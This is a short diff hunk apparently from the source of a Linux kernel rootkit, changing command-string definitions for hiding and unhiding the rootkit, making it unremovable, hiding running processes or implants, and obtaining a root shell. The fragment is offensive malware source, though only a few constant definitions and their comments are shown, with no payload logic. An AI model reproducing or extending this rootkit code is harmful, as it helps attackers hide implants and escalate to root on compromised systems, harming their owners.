@@ -42,8 +42,8 @@
 #define ROOTKIT_SHOW "show";		// command to unhide rootkit => In this mode, ROOTKIT_PROTECT and ROOTKIT_REMOVE will work effectively
 #define ROOTKIT_PROTECT "protect";	// command to make rootkit unremovable (even if it can be seen in usermode).
 #define ROOTKIT_REMOVE "remove";	// command to make rootkit removable
-#define PROCESS "PROCESS";		// command to hide/unhide a running process/implant
-#define ROOT "ROOT";			// command to get root shell
+#define PROCESS "process";		// command to hide/unhide a running process/implant
+#define ROOT "root";			// command to get root shell
 
 
 // To copy value from userspace
